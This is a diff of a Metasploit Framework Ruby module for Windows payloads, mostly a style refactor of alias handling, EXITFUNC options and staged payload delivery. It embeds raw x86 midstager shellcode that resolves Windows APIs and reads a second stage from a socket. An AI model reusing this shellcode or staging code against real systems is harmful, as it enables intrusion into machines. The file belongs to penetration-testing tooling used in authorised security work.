@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 
@@ -10,7 +11,6 @@ require 'msf/core'
 #
 ###
 module Msf::Payload::Windows
-
   require 'msf/core/payload/windows/prepend_migrate'
 
   # Provides the #prepends method
@@ -56,33 +56,29 @@ module Msf::Payload::Windows
   # payloads. It also provides the migrate prepend.
   #
   def initialize(info = {})
-    ret = super( info )
+    ret = super(info)
 
     # All windows payload hint that the stack must be aligned to nop
     # generators and encoders.
-    if( info['Arch'] == ARCH_X64 )
-      if( info['Alias'] )
-        info['Alias'] = 'windows/x64/' + info['Alias']
-      end
-      merge_info( info, 'SaveRegisters' => [ 'rsp' ] )
-    elsif( info['Arch'] == ARCH_X86 )
-      if( info['Alias'] )
-        info['Alias'] = 'windows/' + info['Alias']
-      end
-      merge_info( info, 'SaveRegisters' => [ 'esp' ] )
+    if info['Arch'] == ARCH_X64
+      info['Alias'] = 'windows/x64/' + info['Alias'] if info['Alias']
+      merge_info(info, 'SaveRegisters' => [ 'rsp' ])
+    elsif info['Arch'] == ARCH_X86
+      info['Alias'] = 'windows/' + info['Alias'] if info['Alias']
+      merge_info(info, 'SaveRegisters' => [ 'esp' ])
     end
 
-    #if (info['Alias'])
+    # if (info['Alias'])
     #	info['Alias'] = 'windows/' + info['Alias']
-    #end
-
+    # end
 
     acceptable_exit_types = @@exit_types.keys.collect { |e| e.blank? ? "''" : e }.uniq
 
     register_options(
       [
         Msf::OptEnum.new('EXITFUNC', [true, 'Exit technique', 'process', acceptable_exit_types])
-      ], Msf::Payload::Windows )
+      ], Msf::Payload::Windows
+    )
     ret
   end
 
@@ -90,16 +86,16 @@ module Msf::Payload::Windows
   # Replace the EXITFUNC variable like madness
   #
   def replace_var(raw, name, offset, pack)
-    if (name == 'EXITFUNC')
+    if name == 'EXITFUNC'
       method = datastore[name]
-      method = 'thread' if (!method or @@exit_types.include?(method) == false)
+      method = 'thread' if !method || (@@exit_types.include?(method) == false)
 
       raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')
 
       return true
     end
 
-    return false
+    false
   end
 
   #
@@ -108,13 +104,13 @@ module Msf::Payload::Windows
   # ensure that the entire stage is read in.
   #
   def handle_intermediate_stage(conn, payload)
-    if( self.module_info['Stager']['RequiresMidstager'] == false )
-      conn.put( [ payload.length ].pack('V') )
+    if module_info['Stager']['RequiresMidstager'] == false
+      conn.put([ payload.length ].pack('V'))
       # returning false allows stager.rb!handle_connection() to prepend the stage_prefix if needed
       return false
     end
 
-    return false if (payload.length < 512)
+    return false if payload.length < 512
 
     # The mid-stage works by reading in a four byte length in host-byte
     # order (which represents the length of the stage). Following that, it
@@ -123,24 +119,24 @@ module Msf::Payload::Windows
     # out of stack space or NX problems.
     # See the source file: /external/source/shellcode/windows/midstager.asm
     midstager =
-      "\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
-      "\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x0f\x85\xeb\xff" +
-      "\xff\xff\x8b\x6a\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c" +
-      "\x01\xe9\x8b\x71\x3c\x01\xee\x60\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b" +
-      "\x5b\x14\x8b\x73\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c" +
-      "\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a" +
-      "\x8b\x6b\x10\x8b\x1b\x75\xdb\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef" +
-      "\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0" +
-      "\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x81\xfa\x54" +
-      "\xca\xaf\x91\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" +
-      "\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x08\x61\x89\xe3\x6a" +
-      "\x00\x6a\x04\x53\x57\xff\xd6\x8b\x1b\x6a\x40\x68\x00\x30\x00\x00" +
-      "\x53\x6a\x00\xff\xd5\x89\xc5\x55\x6a\x00\x53\x55\x57\xff\xd6\x01" +
+      "\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" \
+      "\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x0f\x85\xeb\xff" \
+      "\xff\xff\x8b\x6a\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c" \
+      "\x01\xe9\x8b\x71\x3c\x01\xee\x60\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b" \
+      "\x5b\x14\x8b\x73\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c" \
+      "\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a" \
+      "\x8b\x6b\x10\x8b\x1b\x75\xdb\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef" \
+      "\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0" \
+      "\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x81\xfa\x54" \
+      "\xca\xaf\x91\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" \
+      "\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x08\x61\x89\xe3\x6a" \
+      "\x00\x6a\x04\x53\x57\xff\xd6\x8b\x1b\x6a\x40\x68\x00\x30\x00\x00" \
+      "\x53\x6a\x00\xff\xd5\x89\xc5\x55\x6a\x00\x53\x55\x57\xff\xd6\x01" \
       "\xc5\x29\xc3\x85\xdb\x75\xf1\xc3"
 
     # Prepend the stage prefix as necessary, such as a tag that is needed to
     # find the socket
-    midstager = (self.stage_prefix || '') + midstager
+    midstager = (stage_prefix || '') + midstager
 
     print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
 
@@ -156,7 +152,7 @@ module Msf::Payload::Windows
     # it will use as the length of the subsequent stage.
     conn.put([ payload.length ].pack('V'))
 
-    return true
+    true
   end
 
   #
@@ -173,6 +169,4 @@ module Msf::Payload::Windows
   def include_send_uuid
     false
   end
-
 end
-
